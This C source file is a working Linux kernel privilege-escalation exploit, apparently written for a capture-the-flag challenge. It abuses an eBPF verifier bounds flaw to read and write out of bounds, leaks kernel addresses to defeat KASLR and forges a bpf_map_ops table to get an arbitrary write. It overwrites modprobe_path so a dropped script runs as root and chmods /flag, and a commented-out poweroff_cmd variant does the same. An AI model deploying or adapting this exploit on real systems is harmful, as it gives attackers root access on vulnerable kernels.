#define _GNU_SOURCE
#include <stdio.h>       
#include <stdlib.h>      
#include <unistd.h>      
#include <fcntl.h>       
#include <stdint.h>      
#include <string.h>      
#include <sys/ioctl.h>   
#include <sys/syscall.h> 
#include <sys/socket.h>  
#include <errno.h>       
#include <sys/prctl.h>  
#include "linux/bpf.h"   
#include "bpf_insn.h"    
#define LOG_BUF_SIZE 65535

#define BPF_MAP_GET(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

#define BPF_MAP_GET_ADDR(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_MOV64_REG((dst), BPF_REG_0)          	  /* r_dst = (r0)   */

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];

char bpf_log_buf[LOG_BUF_SIZE];

void gen_fake_elf(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /my_exp"); 
    system("chmod +x /my_exp");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /fake");
    system("chmod +x /fake");
}
void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
    gen_fake_elf();
}
void x64dump(char *buf,uint32_t num){         
    uint64_t *buf64 =  (uint64_t *)buf;       
    printf("[-x64dump-] start : \n");         
    for(int i=0;i<num;i++){                   
            if(i%2==0 && i!=0){                   
                printf("\n");                     
            }                                     
            printf("0x%016lx ",*(buf64+i));       
        }                                         
    printf("\n[-x64dump-] end ... \n");       
}                                             
void loglx(char *tag,uint64_t num){         
    printf("[lx] ");                        
    printf(" %-20s ",tag);                  
    printf(": %-#16lx\n",num);              
}                                           

static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version);      
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);
static void __exit(char *err);

struct bpf_insn insns[]={
    //
    BPF_LD_MAP_FD(9,3),             //r9 = ctrl_map_fd
    BPF_MAP_GET(0,5),               //r5 = ctrl_map_fd[0], r0 = &ctrl_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_JMP32_IMM(BPF_JLE, 5, 0x7fffffff, 1),  //if r5 > 0:jmp pc+1
    BPF_EXIT_INSN(),				//r5->min_val = 1
    BPF_JMP_IMM(BPF_JGT, 5, 0, 1),  //if r5 > 0:jmp pc+1
    BPF_EXIT_INSN(),				//r5->min_val = 1
    
	BPF_LD_IMM64(6, 0x600000002),	//r6 = 0x600000002
	BPF_JMP_REG(BPF_JLT, 5, 6, 1),	//if r5 < r:jmp pc+1
	BPF_EXIT_INSN(),				//r5->max_val = 0x100000001

	BPF_ALU64_IMM(BPF_OR, 5, 0),	//r5 |= 0
	BPF_MOV32_REG(6, 5),			//r6_32 = r5_32
	BPF_ALU64_IMM(BPF_RSH, 6, 1),	//r6 >>= 1
    BPF_ALU64_IMM(BPF_MUL,6,0x110), //r6 *= 0x110

    BPF_LD_MAP_FD(9,4),      //r9 = exp_map_fd
    BPF_MAP_GET_ADDR(0,7),          //r7 = &exp_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_ALU64_REG(BPF_SUB,7,6),     //r7 -= r6

    //
    BPF_LD_MAP_FD(9,3),             //r9 = ctrl_map_fd
    BPF_MAP_GET_ADDR(0,6),          //r6 = %ctrl_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_LDX_MEM(BPF_DW,0,7,0),      //r0 = [r7+0]
    BPF_STX_MEM(BPF_DW,6,0,0x10),   //r6+0x10 = r0 = ctrl_map[2]
    BPF_LDX_MEM(BPF_DW,0,7,0xc0),   //r0 = [r7+0xc0]
    BPF_STX_MEM(BPF_DW,6,0,0x18),   //r6+0x18 = r0 = ctrl_map[3]
    BPF_ALU64_IMM(BPF_ADD,0,0x50),  //r0 += 0x50 => element_addr
    
    BPF_LDX_MEM(BPF_DW,8,6,8),      //r8 = [r6+8] = ctrl_map[1]
    BPF_JMP_IMM(BPF_JNE,8,0x2,6),

    //arb write

    BPF_STX_MEM(BPF_DW,7,0,0),      //[r7] = [ops] = r0 = element_addr
    BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK),//[ops+0x18] = BPF_MAP_TYPE_STACK
    BPF_ST_MEM(BPF_W,7,0x24,-1),   //max_entries
    BPF_ST_MEM(BPF_W,7,0x2c,0),    //locak_off
    BPF_ALU64_IMM(BPF_MOV,5,0x1234),     //test:r5 = 1
    BPF_ALU64_IMM(BPF_MUL,5,0x6),     //test:r5 = 1

	//exit
    BPF_ALU64_IMM(BPF_MOV,0,0),     //
    BPF_EXIT_INSN(),
};

void  prep(){
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
    if(ctrlmapfd<0){ __exit(strerror(errno));}
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1);
    if(expmapfd<0){ __exit(strerror(errno));}
    printf("ctrlmapfd: %d,  expmapfd: %d \n",ctrlmapfd,expmapfd);

    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            insns, sizeof(insns), "GPL", 0);  
    if(progfd < 0){ __exit(strerror(errno));}

    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){ 
        __exit(strerror(errno));
    }
}

void pwn(){
    printf("pwning...\n");
    uint32_t key = 0x0;
    char *ctrlbuf = malloc(0x100);
    char *expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i<0x2000/8;i++){
        expbuf64[i] = i+1;
    }
    ctrlbuf64[0]=2;
    ctrlbuf64[1]=0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();

    // leak
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&key,ctrlbuf);
    x64dump(ctrlbuf,8);
    bpf_lookup_elem(expmapfd,&key,expbuf);
    x64dump(expbuf,8);
    uint64_t map_leak = ctrlbuf64[2];
    uint64_t elem_leak = ctrlbuf64[3]-0xc0+0x110;
    //uint64_t kaslr = map_leak - 0xffffffff82016340;
    uint64_t kaslr = map_leak - 0xffffffff820488c0;
    loglx("map_leak",map_leak);
    loglx("elem_leak",elem_leak);
    loglx("kaslr",kaslr);
    //loglx("modprobe",modprobe_path);
    getchar();
    uint64_t fake_map_ops[]={
        kaslr + 0xffffffff811f9d70,
        kaslr + 0xffffffff811fae80,
        0x0,
        kaslr + 0xffffffff811fa5e0,
        kaslr + 0xffffffff811f9e60, //get net key 5
        0x0,
        0x0,
        kaslr + 0xffffffff811dee60,
        0x0,
        kaslr + 0xffffffff811dec20,
        0x0,
        kaslr + 0xffffffff811f9f20,
        kaslr + 0xffffffff811fa4c0,
        kaslr + 0xffffffff811f9ea0,
        kaslr + 0xffffffff811f9e60, //map_push_elem 15
        0x0,
        0x0,
        0x0,
        0x0,
        kaslr + 0xffffffff811fa210,
        0x0,
        kaslr + 0xffffffff811fa030,
        kaslr + 0xffffffff811fac70,
        0x0,
        0x0,
        0x0,
        kaslr + 0xffffffff811f9df0,
        kaslr + 0xffffffff811f9e20,
        kaslr + 0xffffffff811f9fc0,
        0,
    };

    // overwrite bpf_map_ops
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    bpf_update_elem(expmapfd,&key,expbuf,0);

    //overwrite fake ops
    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x2;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();
    uint64_t modprobe_path = 0xFFFFFFFF826613C0+kaslr;
    expbuf64[0] = 0x5f796d2f - 1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path);
    expbuf64[0] = 0x00707865 - 1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+4);
    /*
    //security_task_prctl:0xFFFFFFFF8147CAE0
    //overwrite the hp->hook.task_prctl
    uint64_t poweroff_work_func = 0xFFFFFFFF810C3270 + kaslr;
    uint64_t poweroff_cmd = 0xFFFFFFFF82660C00 + kaslr;
    //here issue
    uint64_t hp_hook = 0xffffffff824466e0 + kaslr;

    expbuf64[0] = (poweroff_work_func & 0xffffffff) - 1;
    bpf_update_elem(expmapfd,&key,expbuf,hp_hook);
    expbuf64[0] = (poweroff_work_func >> 32) - 1;
    bpf_update_elem(expmapfd,&key,expbuf,hp_hook+4);

    //overwite poweroff_cmd to "/bin/chmod 777 /flag"
    expbuf64[0] = 0x6e69622f - 1;
    bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd);
    expbuf64[0] = 0x6d68632f - 1;
    bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+4);
    expbuf64[0] = 0x3720646f - 1;
    bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+8);
    expbuf64[0] = 0x2f203737 - 1;
    bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+0xc);
    expbuf64[0] = 0x67616c66 - 1;
    bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+0x10);
    //trigger
    getchar();
    prctl(0,0);
    */
    return;
}


int main(int argc,char **argv){
    init();
    prep();
    pwn();
    return 0;
}

static void __exit(char *err) {              
    fprintf(stderr, "error: %s\n", err); 
    exit(-1);                            
}                                            

static void writemsg(void) 
{
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  

}                                                
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  

}
static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}
